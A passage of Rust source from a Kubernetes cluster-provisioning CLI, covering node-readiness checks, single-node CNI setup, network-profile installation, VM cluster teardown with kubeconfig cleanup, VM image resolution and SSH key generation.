        let ready = wait_for_cluster_ready(&cp1_target, name, expected, Duration::from_secs(180))?;
        p.ok();
        Some(ready)
    } else {
        None
    };

    // The line this replaces said "ready" unconditionally — even on the
    // historical `wait_ready: false` path, where readiness is never even
    // looked at, and even when `wait_for_cluster_ready` itself had just
    // warned that 0 of N nodes converged. `kubeadm join` returning success
    // means bootstrapped, not Ready; conflating the two is the exact
    // "relato desonesto" this repo's own doctrine rejects elsewhere — see
    // the KaaS capability audit's gap #1.
    match confirmed_ready {
        // `cni: none` is never waited on (`waits_for_ready`), and it gets its own
        // line: «readiness was not checked» would read as if checking could help.
        None if spec.cni == "none" => output::info(&super::po::tf(
            "cluster \"{name}\" bootstrapped with no CNI (`cni: none`) — every node stays \
             NotReady until you apply one: `delonix cluster {name} apply -f <cni>.yaml`",
            &[("name", name)],
        )),
        Some(true) => output::info(&super::po::tf(
            "cluster \"{name}\" ready",
            &[("name", name)],
        )),
        Some(false) => output::info(&super::po::tf(
            "cluster \"{name}\" bootstrapped — not all nodes reported Ready (see the warning \
             above); check with `delonix cluster {name} kubectl get nodes`",
            &[("name", name)],
        )),
        None => output::info(&super::po::tf(
            "cluster \"{name}\" bootstrapped — readiness was not checked (pass --wait, or run \
             `delonix cluster {name} kubectl get nodes` yourself)",
            &[("name", name)],
        )),
    }
    println!("kubeconfig: {}", kubeconfig_path.display());
    println!("export KUBECONFIG={}", kubeconfig_path.display());
    Ok(())
}

/// Polls `kubectl get nodes` on the control-plane until all `expected` nodes
/// report `Ready` (CNI installed and functional) or `timeout` elapses.
/// Returns `Ok(true)` when every node converged, `Ok(false)` when SOME did
/// (a legitimate "still converging" case — slow image pulls, a CNI
/// DaemonSet not yet scheduled — not a reason to fail a bootstrap that
/// otherwise succeeded). `Err` only when NOT EVEN ONE node reached `Ready`
/// by the deadline: `kubeadm join` succeeding on every host and zero of
/// them ever going `Ready` is the exact signature of a CNI that was never
/// applied at all (see the KaaS capability audit's gap #1) — a structurally
/// different, worse case than "slow", and the caller used to report BOTH as
/// success.
fn wait_for_cluster_ready(
    cp1: &SshTarget,
    cluster_name: &str,
    expected: usize,
    timeout: Duration,
) -> Result<bool> {
    let deadline = std::time::Instant::now() + timeout;
    loop {
        let out = remote::ssh_run(
            cp1,
            "kubectl --kubeconfig=/etc/kubernetes/admin.conf get nodes --no-headers 2>/dev/null",
        )
        .unwrap_or_default();
        let ready = out
            .lines()
            .filter(|l| l.split_whitespace().nth(1) == Some("Ready"))
            .count();
        if ready >= expected && expected > 0 {
            return Ok(true);
        }
        if std::time::Instant::now() >= deadline {
            output::warn(&super::po::tf(
                "cluster \"{name}\": only {ready}/{n} node(s) Ready after the wait — the cluster \
                 is bootstrapped, the CNI may still be converging",
                &[
                    ("name", cluster_name),
                    ("ready", &ready.to_string()),
                    ("n", &expected.to_string()),
                ],
            ));
            if ready == 0 {
                return Err(Error::Invalid(super::po::tf(
                    "cluster \"{name}\": 0/{n} node(s) ever reached Ready — the cluster is \
                     bootstrapped (kubeadm join succeeded everywhere) but has no working pod \
                     network; apply a CNI by hand (`KUBECONFIG=... kubectl apply -f <cni>.yaml` \
                     on the control-plane) and re-run with --wait, or check \
                     `kubectl get nodes`/`kubectl describe node` yourself",
                    &[("name", cluster_name), ("n", &expected.to_string())],
                )));
            }
            return Ok(false);
        }
        std::thread::sleep(Duration::from_secs(5));
    }
}

/// The "default" CNI for a cluster with EXACTLY one node total: a plain
/// bridge + host-local IPAM conflist at `/etc/cni/net.d/10-bridge.conflist`.
/// This is not new networking mechanism — it is the identical conflist
/// `delonix-cri`'s own root-mode pod-sandbox path already requires and reads
/// (ADR-0074; the AGENTS.md section on fixing the root-CNI bridge has this
/// exact shape live-validated against a real kubelet) — wiring it into the
/// bootstrap, not inventing it. Also removes the default
/// `node-role.kubernetes.io/control-plane` taint (mirrors kind-mode's own
/// `cfg.workers == 0` branch in `kindmode.rs`): without it nothing
/// user-facing — not even CoreDNS — ever schedules onto a control-plane-only
/// node.
///
/// Idempotent: writing the same file twice and re-applying `kubectl taint
/// ... -` on an already-untainted node are both no-ops.
///
/// Scope, deliberately: multi-node clusters do not call this (see the call
/// site) — a plain bridge CNI has no mechanism to route pod traffic between
/// nodes, and shipping that silently would trade one broken promise for
/// another, just quieter.
///
/// `pod_subnet` is `single_node_bridge_conflist`'s only moving part, kept
/// pure and separate so the JSON shape is unit-tested without SSH.
fn single_node_bridge_conflist(pod_subnet: &str) -> String {
    format!(
        "{{\"cniVersion\":\"1.0.0\",\"name\":\"bridge\",\"plugins\":[\
         {{\"type\":\"bridge\",\"bridge\":\"cni0\",\"isGateway\":true,\"ipMasq\":true,\
         \"hairpinMode\":true,\"ipam\":{{\"type\":\"host-local\",\
         \"ranges\":[[{{\"subnet\":\"{pod_subnet}\"}}]],\"routes\":[{{\"dst\":\"0.0.0.0/0\"}}]}}}},\
         {{\"type\":\"portmap\",\"capabilities\":{{\"portMappings\":true}}}}]}}"
    )
}

fn ensure_single_node_cni(cp1: &SshTarget, pod_subnet: &str) -> Result<()> {
    let conflist = single_node_bridge_conflist(pod_subnet);
    let tmp = delonix_state::write_private_temp("delonix-10-bridge.conflist", conflist.as_bytes())
        .map_err(|e| {
            Error::Invalid(format!(
                "{}: {e}",
                super::po::t("writing the default CNI conflist")
            ))
        })?;
    // Staged under a path of this operation's own, like every other upload here
    // (`stage_and_install`): a single-node cluster cannot race itself, but a
    // FIXED `/tmp` name on a shared node is guessable by any local user there,
    // which is the same reason the local side above uses `write_private_temp`.
    let outcome = stage_and_install(cp1, &tmp, "delonix-10-bridge.conflist", |staged| {
        format!(
            "mkdir -p /etc/cni/net.d && \
             mv {staged} /etc/cni/net.d/10-bridge.conflist && \
             KUBECONFIG=/etc/kubernetes/admin.conf kubectl taint nodes --all \
             node-role.kubernetes.io/control-plane- >/dev/null 2>&1; true"
        )
    });
    let _ = std::fs::remove_file(&tmp);
    outcome.map_err(|e| Error::Invalid(format!("the default CNI conflist: {e}")))?;
    Ok(())
}

/// Installs the selected pod-network PROFILE on a freshly `kubeadm init`-ed
/// control-plane, and records what was installed.
///
/// Order, and why each step is where it is:
///
/// 1. **Refuse a profile change first.** A cluster that already runs another
///    CNI is left exactly as it is (DX-6703) — before an artefact is fetched,
///    before a byte is sent. There is no in-place migration here, and
///    discovering that halfway through would leave two owners of the pod
///    network.
/// 2. **A re-run of the SAME profile is allowed through**, because
///    `kubectl apply` is idempotent and re-applying is how a half-finished
///    install is resumed. This is the idempotency this step offers: not a
///    `check` that skips, but an apply that converges.
/// 3. **Fetch and verify, then render, then apply.** The artefact is proven
///    against its pinned digest on the HOST (`fetch_artefact`), so nothing
///    unverified ever reaches a node.
/// 4. **Record last.** The record is what this engine MEANT; it is written
///    after the apply so a failed apply does not leave a record claiming
///    success. The live cluster is always the authority
///    (`observed_profile`), and the two together are what `cluster network
///    status` compares.
///
/// The control-plane taint is removed only for a single-node cluster, mirroring
/// `ensure_single_node_cni`: with workers present, a tainted control-plane is
/// the correct, intended topology.
fn install_network_profile(
    cp1: &SshTarget,
    name: &str,
    spec: &ClusterSpec,
    endpoint: &str,
    p: &mut output::Progress,
) -> Result<()> {
    let nodes = spec
        .control_plane
        .count()
        .saturating_add(spec.workers.count());
    let plan = network_plan(spec, nodes)?;
    let profile = plan.profile;

    // (1) the cluster's own answer wins over our manifest.
    let installed = net_profiles_install::observed_profile(cp1);
    super::net_profiles::check_profile_change(&installed, profile)?;

    p.step(
        &super::po::tf(
            "Installing the {cni} pod network",
            &[("cni", profile.name())],
        ),
        "🔌",
    );
    let artefact = profile
        .artefact()
        .ok_or_else(|| Error::Invalid("profile has no artefact".to_string()))?;
    let path = net_profiles_install::fetch_artefact(&artefact, plan.offline)?;
    let mut yaml = net_profiles_install::render(&plan, &path)?;
    // Cilium's kube-proxy replacement cannot reach the apiserver through a
    // Service it is replacing, so it has to be told the real endpoint. That
    // is a CLUSTER fact, not a profile fact, which is why it is appended here
    // and not inside the (host-agnostic) value list.
    if profile == super::net_profiles::Profile::Cilium && plan.skips_kube_proxy() {
        yaml = net_profiles_install::with_api_server(&yaml, endpoint);
    }
    net_profiles_install::apply_manifest(cp1, profile.name(), &yaml)?;
    if nodes == 1 {
        remote::ssh_run(
            cp1,
            "KUBECONFIG=/etc/kubernetes/admin.conf kubectl taint nodes --all \
             node-role.kubernetes.io/control-plane- >/dev/null 2>&1; true",
        )
        .map_err(|e| Error::Invalid(format!("removing the control-plane taint: {e}")))?;
    }
    p.ok();

    if plan.multus {
        p.step(super::po::t("Installing Multus"), "🧩");
        let m = super::net_profiles::multus_artefact();
        let mpath = net_profiles_install::fetch_artefact(&m, plan.offline)?;
        let myaml = std::fs::read_to_string(&mpath)
            .map_err(|e| Error::Invalid(format!("reading the Multus manifest: {e}")))?;
        net_profiles_install::apply_manifest(cp1, "multus", &myaml)?;
        p.ok();
    }

    net_profiles_install::write_record(
        name,
        &net_profiles_install::ProfileRecord {
            cni: profile.name().to_string(),
            version: profile.version().to_string(),
            dataplane: plan.dataplane.to_string(),
            kube_proxy: plan.kube_proxy.to_string(),
            mtu: plan.mtu,
            pod_subnet: net_profiles_install::cidr_text(plan.pod_subnet),
            service_subnet: net_profiles_install::cidr_text(plan.service_subnet),
            multus: plan.multus,
            hubble: plan.hubble,
            artefact_sha256: artefact.sha256.to_string(),
        },
    )?;
    Ok(())
}

// ---------------------------------------------------------------------------
// `delonix cluster kubeadm` — provisions VMs + calls `apply_one`
// ---------------------------------------------------------------------------

struct ProvisionArgs {
    name: String,
    control_plane: u32,
    workers: u32,
    vm_image: Option<String>,
    network: String,
    ssh_key: Option<PathBuf>,
    vcpus: u32,
    memory: String,
    k8s_version: Option<String>,
    pod_subnet: String,
    service_subnet: String,
    /// `--cni`/`spec.cni`, validated by `net_profiles::validate` before any VM
    /// is created.
    cni: String,
    /// The `spec.network` equivalents of the `--cni-*` flags. Named `net_block`
    /// and not `network` because `network` here is already the name of the VM
    /// network the nodes are attached to — two different networks, and the
    /// collision is exactly the kind that produces a cluster wired to the
    /// wrong one.
    net_block: NetworkBlock,
    boot_timeout: u64,
    copy_kubeconfig: bool,
    /// `None`/`Some(0)` = stacked etcd (default, unchanged). `Some(n >= 1)` =
    /// auto-provision `n` more VMs as a dedicated etcd cluster (odd `n` for a
    /// well-defined quorum, or exactly 1 for dev/test — see `validate()`).
    etcd_cluster: Option<u32>,
    /// `--cri-bin`: the `delonix-cri` to install (else resolved, see `resolve_cri_bin`).
    cri_bin: Option<PathBuf>,
    /// `--use-context`: make this cluster the one a bare `kubectl` talks to,
    /// even when `~/.kube/config` already points somewhere usable. Carried as
    /// a `bool` here to match the flag, and turned into a
    /// [`ContextTakeover`] at the single place that consumes it.
    use_context: bool,
}

/// Deterministic VM names of a role (`<cluster>-cp1`, `<cluster>-w1`, ...).
fn vm_names(cluster_name: &str, role: &str, count: u32) -> Vec<String> {
    (1..=count)
        .map(|i| format!("{cluster_name}-{role}{i}"))
        .collect()
}

/// The inverse of `vm_names`/the `<name>-lb` literal `provision_and_apply`
/// writes: does `vm_name` belong to the cluster `cluster_name` provisioned?
/// PURE, so the naming convention this file has in TWO places (the names it
/// writes, and now the names a destroy has to find) cannot quietly drift
/// apart from a single string literal changing in only one of them.
pub(crate) fn is_cluster_vm(vm_name: &str, cluster_name: &str) -> bool {
    let Some(rest) = vm_name.strip_prefix(cluster_name) else {
        return false;
    };
    let Some(suffix) = rest.strip_prefix('-') else {
        return false;
    };
    suffix == "lb"
        || ["cp", "w", "etcd"].iter().any(|role| {
            suffix
                .strip_prefix(role)
                .is_some_and(|n| !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()))
        })
}

/// Every VM this engine's own store knows about that belongs to cluster
/// `cluster_name` — empty when the cluster was not VM/SSH-provisioned at
/// all (the caller falls back to kind-mode's own resolution in that case).
pub(crate) fn cluster_vm_names(cluster_name: &str) -> Result<Vec<String>> {
    Ok(delonix_vm::list(&state_root())?
        .into_iter()
        .filter(|vm| is_cluster_vm(&vm.name, cluster_name))
        .map(|vm| vm.name)
        .collect())
}

/// `cluster destroy <name>` for a VM/SSH-provisioned cluster — the half that
/// never existed (KaaS capability audit, gap #10): `ClusterCmd::Destroy`
/// went straight to kind-mode's own `destroy`, which only ever looks at
/// containers carrying the `io.x-k8s.kind.cluster` label, so a cluster made
/// of VMs had no destroy verb at all. An operator's only way to tear one
/// down was `vm rm` on every node by hand, plus editing `~/.kube/config`
/// themselves — exactly what this same audit's own live-validation test
/// (`docs/discovery/naas-kaas-caas-auditoria-2026-10-08.md` §4.6) had to do,
/// which is how this gap went from "known" to "fixed".
///
/// Name of the network a VM cluster gets when `--network` is omitted.
///
/// DETERMINISTIC from the cluster name, and that is the whole design: it is
/// what lets [`destroy_vm_cluster`] recompute the name and recognize its own
/// network without persisting a "the engine owns this one" flag anywhere. A
/// random suffix would need that flag, and a flag that goes missing leaks a
/// network per create/destroy cycle.
///
/// The suffix also keeps the name out of the way of an operator's own: a bare
/// `lab` could collide with a network someone already has, and silently
/// attaching a cluster to it would be worse than a clumsy name. Kind mode
/// solves the same problem with a `dlx-` PREFIX (`cluster_net`); this path
/// uses a suffix instead, so a cluster's network sorts next to its own name.
fn cluster_vm_net(name: &str) -> String {
    let h = vmimage::hex_sha256(name.as_bytes());
    format!("{name}-{}", &h[..8])
}

/// Makes sure the cluster's OWN network exists, and returns its name.
///
/// Idempotent, because [`cluster_vm_net`] is deterministic: a second
/// `cluster kubeadm` for the same name finds the network already there and
/// reuses it instead of failing on a conflict.
///
/// Goes through [`super::network::create_network`] — the same entry point kind
/// mode uses — and NOT `infra::network_create` alone, which would leave the
/// `NetworkStore` without a record (see that function's own doc-comment for
/// what breaks then). The subnet is left to the allocator, exactly as a bare
/// `delonix network create` would.
fn ensure_cluster_network(cluster: &str) -> Result<String> {
    let net = cluster_vm_net(cluster);
    let store = delonix_sdn::NetworkStore::open(state_root())?;
    if store.get(&net).is_ok() {
        return Ok(net);
    }
    super::network::create_network(&store, &net, "bridge", None, None, "", None, vec![], None)?;
    output::info(&super::po::tf(
        "created network \"{net}\" for cluster \"{cluster}\" (removed again by `cluster destroy`)",
        &[("net", &net), ("cluster", cluster)],
    ));
    Ok(net)
}

/// Whether a network named exactly [`cluster_vm_net`] exists — i.e. whether
/// this cluster has one of ITS OWN to remove. Asked before the confirmation
/// prompt so the prompt can say which case the operator is in.
fn owns_cluster_network(name: &str) -> bool {
    delonix_sdn::NetworkStore::open(state_root())
        .map(|s| s.get(&cluster_vm_net(name)).is_ok())
        .unwrap_or(false)
}

/// Removes the cluster's own network — and ONLY its own.
///
/// The test is the name: [`cluster_vm_net`] is deterministic, so a network
/// called exactly that is one [`ensure_cluster_network`] created. A network
/// the operator passed in `--network` has any other name and is left alone,
/// because they created it and this command did not.
///
/// Both stores, in the order kind mode's own prune uses: the declarative
/// record first, then the physical plane. Best-effort throughout — a cluster
/// whose VMs are gone must not stay undeletable because a bridge refused to.
fn remove_cluster_network(name: &str) {
    if !owns_cluster_network(name) {
        return;
    }
    let net = cluster_vm_net(name);
    if let Ok(store) = delonix_sdn::NetworkStore::open(state_root()) {
        let _ = store.remove(&net);
        delonix_sdn::infra::network_remove(&net);
    }
}

/// Removes the network only when this command CREATED it — see
/// [`remove_cluster_network`]. A network named in `--network` belongs to the
/// operator and is never touched, the same way kind-mode's own `delete` only
/// removes the network IT created (`cluster_net(name)`) and never a user's.
fn destroy_vm_cluster(name: &str, vms: &[String], force: bool) -> Result<()> {
    if !super::prune::confirm(
        force,
        &super::po::tf(
            "`cluster destroy` removes VM-provisioned cluster '{name}' — pass --force to \
             confirm when not on a terminal",
            &[("name", name)],
        ),
        Some(super::po::tf(
            "This will remove {n} VM(s) of cluster '{name}', its cached kubeconfig, and the \
             matching ~/.kube/config entries.{net}",
            &[
                ("n", &vms.len().to_string()),
                ("name", name),
                // Says which of the two cases this cluster is in, instead of
                // one sentence that is wrong half the time: a network this
                // command created goes with it, a network the operator named
                // does not.
                (
                    "net",
                    &match owns_cluster_network(name) {
                        true => super::po::tf(
                            " Its own network '{net}' goes too.",
                            &[("net", &cluster_vm_net(name))],
                        ),
                        false => super::po::t(
                            " The network it used is left alone — you created it, this command \
                             did not.",
                        )
                        .to_string(),
                    },
                ),
            ],
        )),
        super::po::t("Continue? [y/N]"),
    )? {
        return Ok(());
    }
    super::output::info(&format!(
        "{} \"{name}\"",
        super::po::t("Destroying cluster")
    ));
    let base = state_root();
    let mut p = super::output::Progress::new();
    for vm_name in vms {
        p.step(
            &format!("{} '{vm_name}'", super::po::t("Removing VM")),
            "🗑️",
        );
        vm::cmd_rm(&base, vm_name, true)?;
        p.ok();
    }
    // AFTER the VMs: a bridge with interfaces still on it is one the kernel
    // may refuse to take down. Only when the network is this command's own —
    // and only then is the step even shown, so the progress does not announce
    // work it is not doing.
    if owns_cluster_network(name) {
        p.step(
            &format!(
                "{} '{}'",
                super::po::t("Removing network"),
                cluster_vm_net(name)
            ),
            "🕸️",
        );
        remove_cluster_network(name);
        p.ok();
    }
    p.step(super::po::t("Cleaning up kubeconfig and context"), "🧹");
    let _ = std::fs::remove_file(
        base.join("clusters")
            .join(format!("{name}-kubeconfig.yaml")),
    );
    let _ = std::fs::remove_dir_all(base.join("clusters").join(name));
    let local_kubeconfig =
        std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".kube").join("config"));
    match local_kubeconfig.map(|dest| remove_local_kubeconfig_entries(&dest, name)) {
        None | Some(Ok(())) => p.ok(),
        Some(Err(e)) => {
            p.step("", ""); // closes the cleanup step with ✗ before the warning
            super::output::warn(&super::po::tf(
                "could not remove kubeconfig entries for '{name}': {e}",
                &[("name", name), ("e", &e.to_string())],
            ));
        }
    }
    drop(p);
    println!(
        "{}",
        super::po::tf(
            "cluster '{name}' removed ({n} VM(s))",
            &[("name", name), ("n", &vms.len().to_string())],
        )
    );
    Ok(())
}

/// Removes the `clusters[]`/`contexts[]` entries named `cluster_name` and
/// the `users[]` entry named `<cluster_name>-admin` from the kubeconfig at
/// `dest` — the exact three names `merge_into_local_kubeconfig` writes a
/// VM/SSH cluster's kubeconfig under (same `dest` parameter shape as that
/// function, for the same reason: testable without mutating `$HOME`).
/// Clears `current-context` too, if it was pointing here: left dangling, it
/// would make a bare `kubectl` fail at EVERYTHING instead of just this one
/// cluster. Mirrors kind-mode's own `remove_kubecontext` shape exactly; not
/// the same function, because the two naming conventions differ (kind-mode
/// uses ONE name for all three kinds of entry; a VM/SSH cluster's user
/// entry is `<name>-admin`).
fn remove_local_kubeconfig_entries(dest: &Path, cluster_name: &str) -> Result<()> {
    use serde_yaml::Value;
    let Ok(txt) = std::fs::read_to_string(dest) else {
        return Ok(());
    };
    if txt.trim().is_empty() {
        return Ok(());
    }
    let mut cfg: Value = serde_yaml::from_str(&txt).map_err(|e| {
        Error::Invalid(format!(
            "{} {}: {e}",
            dest.display(),
            super::po::t("is not valid YAML")
        ))
    })?;
    let user_name = format!("{cluster_name}-admin");
    let mut changed = false;
    for (key, target) in [
        ("clusters", cluster_name),
        ("contexts", cluster_name),
        ("users", user_name.as_str()),
    ] {
        if let Some(seq) = cfg.get_mut(key).and_then(|v| v.as_sequence_mut()) {
            let before = seq.len();
            seq.retain(|e| e.get("name").and_then(|n| n.as_str()) != Some(target));
            changed |= seq.len() != before;
        }
    }
    if cfg.get("current-context").and_then(|v| v.as_str()) == Some(cluster_name) {
        if let Some(m) = cfg.as_mapping_mut() {
            m.remove(Value::from("current-context"));
        }
        changed = true;
    }
    if !changed {
        return Ok(());
    }
    let out = serde_yaml::to_string(&cfg).map_err(|e| Error::Invalid(e.to_string()))?;
    let tmp = dest.with_extension("delonix.tmp");
    std::fs::write(&tmp, out)?;
    std::fs::rename(&tmp, dest)?;
    Ok(())
}

/// Removes a VM/SSH cluster's three kubeconfig entries, but ONLY when they are
/// recognizably the ones this engine wrote.
///
/// BUG FIXED HERE: `cluster destroy <name>` only reaches `destroy_vm_cluster`
/// when the cluster still HAS VMs. A `mode: ssh` cluster — remote hosts that
/// were already live, which this engine never created a machine for — has none
/// by definition, so it falls through to kind-mode's leftover collection. That
/// path removes the cached `<name>-kubeconfig.yaml` and the state directory,
/// but its own context cleanup looks for `delonix-<name>`, which matches NONE
/// of the three names a VM/SSH cluster is merged under. Destroying such a
/// cluster therefore left all three `~/.kube/config` entries behind, so
/// `kubectl config get-contexts` kept listing a cluster whose hosts were gone
/// and `current-context` could stay pointing at it.
///
/// The guard is the `users[]` entry named `<name>-admin`: a name
/// `merge_into_local_kubeconfig` invents and nothing else on the host does. It
/// is needed because the cluster and context entries are named after the
/// cluster and nothing else, so an operator may hold an unrelated, hand-written
/// context of the same name — and collecting a leftover must not delete a
/// context for a cluster this engine never created. Without the marker the
/// triple is left strictly alone, which is why `destroy_vm_cluster` keeps
/// calling the unguarded removal: there, the VMs it just removed are the proof
/// the cluster was ours.
pub(crate) fn remove_ssh_kubeconfig_entries(dest: &Path, cluster_name: &str) -> Result<()> {
    let Ok(txt) = std::fs::read_to_string(dest) else {
        return Ok(());
    };
    let Ok(cfg) = serde_yaml::from_str::<serde_yaml::Value>(&txt) else {
        // A kubeconfig this function cannot parse is one it must not rewrite.
        // The caller is collecting leftovers and has no credentials at stake
        // here; the unguarded path is where a parse error is worth reporting.
        return Ok(());
    };
    let marker = format!("{cluster_name}-admin");
    let ours = cfg
        .get("users")
        .and_then(|v| v.as_sequence())
        .is_some_and(|seq| {
            seq.iter()
                .any(|e| e.get("name").and_then(|n| n.as_str()) == Some(marker.as_str()))
        });
    if !ours {
        return Ok(());
    }
    remove_local_kubeconfig_entries(dest, cluster_name)
}

/// The OCI reference to `vm pull` for a resolved `image_tag` that has no
/// local qcow2: if `image_tag` already looks like a full reference (has a
/// `/`, e.g. a non-official registry/repo), used as-is; otherwise it is a
/// bare tag or the `delonix-vm-k8s:<v>` local-name convention (from
/// `--k8s-version`) — either way, resolved against the OFFICIAL golden image
/// repo (`vmimage::OFFICIAL_VM_IMAGE`'s repo, same default `vm pull` uses),
/// taking only the tag portion so we never double up a `repo:` prefix.
fn official_pull_source(image_tag: &str) -> String {
    if image_tag.contains('/') {
        return image_tag.to_string();
    }
    let official_repo = vmimage::OFFICIAL_VM_IMAGE
        .rsplit_once(':')
        .map(|(repo, _tag)| repo)
        .unwrap_or(vmimage::OFFICIAL_VM_IMAGE);
    let tag = image_tag.rsplit(':').next().unwrap_or(image_tag);
    format!("{official_repo}:{tag}")
}

/// Random Angolan-style name for a NEW kubeadm cluster with no `--name` —
/// same pattern as auto-named containers and `cluster create` (kind mode,
/// `kindmode::random_cluster_name`). A kubeadm cluster has no registry entry
/// of its own — it IS its VMs (`<name>-cp1`/`<name>-w1`, see `vm_names`) — so
/// a candidate collides if any EXISTING VM name already starts with
/// `<candidate>-`.
fn random_kubeadm_cluster_name(base: &std::path::Path) -> Result<String> {
    let existing = delonix_vm::list(base)?;
    super::names::random_name(|n| {
        let prefix = format!("{n}-");
        existing.iter().any(|vm| vm.name.starts_with(&prefix))
    })
    .ok_or_else(|| {
        Error::Invalid(super::po::t("could not invent a free name — pass `--name`").into())
    })
}

/// Resolves the tag of the golden VM image to use, in order: the explicit
/// `--vm-image` (if it isn't a local image's exact name, but the
/// `delonix-vm-k8s:<v>` convention IS — e.g. `--vm-image 1.34` where `vm
/// pull` actually saved it as `delonix-vm-k8s:1.34` — the convention wins,
/// so an already-pulled image is never treated as missing over a naming
/// mismatch); else, if `--k8s-version <v>` was given, the same convention
/// name if present locally; else the only local image that exists (clear
/// error if there are 0 or more than 1 — never picks blindly among
/// several). A name (explicit or `--k8s-version`) that matches NEITHER form
/// locally is still returned as given — `provision_and_apply` pulls it from
/// the official registry (see `official_pull_source`) rather than failing
/// outright, since the golden image is a published OCI artifact precisely
/// so it does not need to be pre-pulled by hand.
///
/// The `--k8s-version`/convention matching is name-based, not a metadata
/// scan: a `vm pull`ed image has `k8s_version: null` in its own record (the
/// OCI artifact only carries the qcow2 blob, not the build metadata — a
/// known gap, see AGENTS.md), so matching by the image's OWN naming
/// convention is the one reliable signal for the common case of several k8s
/// versions pulled side by side.
pub(crate) fn resolve_vm_image(
    store: &VmImageStore,
    explicit: Option<String>,
    k8s_version: Option<&str>,
) -> Result<String> {
    if let Some(tag) = explicit {
        let images = store.list()?;
        if !images.iter().any(|img| img.name == tag) {
            let wanted = format!("delonix-vm-k8s:{tag}");
            if images.iter().any(|img| img.name == wanted) {
                return Ok(wanted);
            }
        }
        return Ok(tag);
    }
    let mut images = store.list()?;
    if let Some(v) = k8s_version {
        let wanted = format!("delonix-vm-k8s:{v}");
        if images.iter().any(|img| img.name == wanted) {
            return Ok(wanted);
        }
    }
    match images.len() {
        0 => Err(Error::Invalid(
            super::po::t("no local VM images — run `delonix vm image build` (or `pull`) first, or pass the image/disk explicitly")
                .into(),
        )),
        1 => Ok(images.remove(0).name),
        n => Err(Error::Invalid(super::po::tf(
            "{n} local VM images — say which one: `--vm-image <tag>` (cluster) or `--disk <path>` (vm create), or `--k8s-version <v>` if `delonix-vm-k8s:<v>` is one of them. Available: {names}",
            &[
                ("n", &n.to_string()),
                (
                    "names",
                    // NAMING them, instead of sending the reader to another
                    // command: the answer to "which one" is three words long and
                    // was one command away for no reason.
                    &images
                        .iter()
                        .map(|i| i.name.clone())
                        .collect::<Vec<_>>()
                        .join(", "),
                ),
            ],
        ))),
    }
}

/// Resolves the VM image to use, DOWNLOADING the official one when nothing is
/// local.
///
/// Shared by `cluster kubeadm` and `vm create` on purpose. The pull already
/// existed on the cluster path only, so the same missing image was a helpful
/// download in one command and a dead end in the other — `vm create` answered
/// "no local VM images — run `delonix vm image build` (or `pull`) first",
/// which is a research task for something the project publishes as an OCI
/// artifact precisely so it never has to be built by hand.
///
/// When the download is not possible either, the error LISTS what the official
/// repository actually offers rather than naming a command to run to find out.
pub(crate) fn resolve_or_pull_vm_image(
    store: &VmImageStore,
    explicit: Option<String>,
    k8s_version: Option<&str>,
) -> Result<String> {
    match resolve_vm_image(store, explicit.clone(), k8s_version) {
        Ok(tag) if store.qcow2_path(&tag).exists() => Ok(tag),
        // Resolved to a name whose qcow2 is absent (a `pull` that recorded
        // metadata and lost the blob, or a hand-edited store): fall through to
        // the download, which is what the caller wanted anyway.
        Ok(tag) => pull_official(store, &tag).map(|()| tag),
        Err(e) => {
            // Only the "nothing local" case is ours to fix. "Several local
            // images" is a question only the caller can answer, and downloading
            // a third would make it worse.
            if store.list().map(|l| !l.is_empty()).unwrap_or(true) {
                return Err(e);
            }
            let tag = explicit
                .or_else(|| k8s_version.map(|v| format!("delonix-vm-k8s:{v}")))
                .unwrap_or_else(|| {
                    vmimage::OFFICIAL_VM_IMAGE
                        .rsplit('/')
                        .next()
                        .unwrap_or(vmimage::OFFICIAL_VM_IMAGE)
                        .to_string()
                });
            pull_official(store, &tag).map(|()| tag)
        }
    }
}

/// Downloads `tag` from the official repository, or explains what IS there.
fn pull_official(store: &VmImageStore, tag: &str) -> Result<()> {
    let source = official_pull_source(tag);
    println!(
        "{}",
        super::po::tf(
            "VM image '{tag}' is not local — downloading from '{source}'...",
            &[("tag", tag), ("source", &source)],
        )
    );
    match vmimage::cmd_pull(store, &source, Some(tag.to_string())) {
        Ok(()) => Ok(()),
        Err(e) => {
            let repo = source.rsplit_once(':').map(|(r, _)| r).unwrap_or(&source);
            let choices = delonix_oci::registry::list_remote_tags(&state_root(), repo)
                .map(|t| t.join(", "))
                .unwrap_or_default();
            if choices.is_empty() {
                return Err(e);
            }
            Err(Error::Invalid(super::po::tf(
                "could not download '{source}': {e}. Published there: {choices} — pick one with \
                 `delonix vm image pull {repo}:<tag>`, or build your own with `delonix vm image build`.",
                &[
                    ("source", &source),
                    ("e", &e.to_string()),
                    ("choices", &choices),
                    ("repo", repo),
                ],
            )))
        }
    }
}

/// Private SSH key to use: the explicit one, or generates a new ed25519 pair in
/// `<root>/clusters/<name>/id_ed25519` (non-interactive `ssh-keygen`, no
/// passphrase — automation, same spirit as the `BatchMode=yes` already used in
/// `remote.rs`). Returns `(private_path, public_text)`.
pub(crate) fn generate_or_load_ssh_key(
    name: &str,
    explicit: Option<PathBuf>,
) -> Result<(PathBuf, String)> {
    if let Some(key) = explicit {
        let pub_path = key.with_extension("pub");
        let public = std::fs::read_to_string(&pub_path).map_err(|e| {
            Error::Invalid(format!(
                "{}: {e}",
                super::po::tf(
                    "could not read public key '{path}'",
                    &[("path", &pub_path.display().to_string())],
                )
            ))
        })?;
        return Ok((key, public.trim().to_string()));
    }
    let dir = state_root().join("clusters").join(name);
    std::fs::create_dir_all(&dir)?;
    let key_path = dir.join("id_ed25519");
    if !key_path.exists() {
        let status = Command::new("ssh-keygen")
            .args(["-q", "-t", "ed25519", "-N", "", "-f"])
            .arg(&key_path)
            .args(["-C", &format!("delonix-cluster-{name}")])
            .status()
            .map_err(|e| Error::Invalid(format!("{}: {e}", super::po::t("running ssh-keygen"))))?;
        if !status.success() {
            return Err(Error::Invalid(super::po::t("ssh-keygen failed").into()));
        }
    }
    let public = std::fs::read_to_string(key_path.with_extension("pub"))?;
    Ok((key_path, public.trim().to_string()))
}

/// Waits for a VM to become reachable over SSH: first the IP (reconciled by the
/// backend — DHCP/`domifaddr`, typically fast), then a real `ssh_check`
/// (the OS boot / sshd startup takes longer). Returns the IP.
fn wait_for_vm_ssh_ready(vm_name: &str, ssh: &SshSpec, timeout: Duration) -> Result<String> {
    let base = state_root();
    let deadline = Instant::now() + timeout;

    let ip = loop {
        let vm = delonix_vm::status(&base, vm_name)?;
        if let Some(ip) = vm.ip {
            break ip;
        }
        if Instant::now() >= deadline {
            return Err(Error::Invalid(super::po::tf(
